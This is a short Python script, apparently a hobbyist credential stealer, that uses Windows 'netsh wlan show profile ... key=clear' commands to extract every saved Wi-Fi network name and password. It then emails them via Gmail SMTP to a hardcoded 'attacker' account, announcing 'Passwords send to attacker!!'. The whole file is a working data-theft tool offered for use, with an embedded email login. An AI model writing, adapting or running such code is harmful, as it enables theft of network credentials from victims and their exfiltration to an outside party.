#Author : attacker127.0.0.1 :)
import subprocess
import re
import smtplib

def sent_mail(email,password,message):
    server=smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()


command= "netsh wlan show profile"
profilelit=subprocess.check_output(command).decode('utf')
profilelit=re.findall("(?:Profile\s*):(\s.*)",profilelit)
#-------------------------------------#
#print(profilelit)
# remove \r
#-------------------------------------#
list=[ ]
for i in profilelit:
    list.append(i.strip())
#print(list)

final =[]
for i in list:
    cmd="netsh wlan show profile "+"\""+i+"\""+" key=clear"
    list1=subprocess.check_output(cmd,shell=True).decode('utf')
    test1 = re.findall("(?:Key\sContent\s*):\s(.*)",list1)
    if not test1:
        final.append("open")
    final=final+test1

#-------------------------------------#
#print(final)
# Remove \r
#-------------------------------------#
keys=[]
for key in final:
    keys.append(key.strip())
#print(keys)
#print("*"*80)
#print(" Name\t\t\t\t\tPasswords")
#print("*"*80)

test4= ''
for i in range(len(list)):
    test1='Name : '+list[i] + "\n"
    test2='Password '+keys[i] + "\n\n"
    test3=test1+test2
    test4=test4+test3

#print(test4)
sent_mail("attacker127.0.0.1@gmail.com","H@ck gm@il attacker14",test4)
print()
print(" Passwords send to attacker!!")
print()
